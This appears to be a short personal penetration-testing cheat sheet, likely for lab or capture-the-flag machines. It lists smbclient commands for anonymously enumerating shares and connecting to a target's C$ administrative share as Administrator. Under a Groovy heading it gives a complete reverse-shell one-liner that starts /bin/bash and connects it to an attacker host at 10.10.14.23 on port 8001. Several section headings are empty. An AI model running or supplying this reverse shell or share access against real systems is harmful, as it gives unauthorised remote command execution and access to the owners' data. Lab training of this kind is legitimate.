# Linux

## Recon enumeration

#### SMBClient

```
smbclient -N -L \\\\{TARGET_IP}\\
smbclient -L 10.129.209.18 -U Administrator
smbclient \\\\10.129.209.18\C$ -U Administrator
```

## Foothold

## Privilege escalation

## Services

#### Groovy

```
Groovy rs
String host="10.10.14.23";
int port=8001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
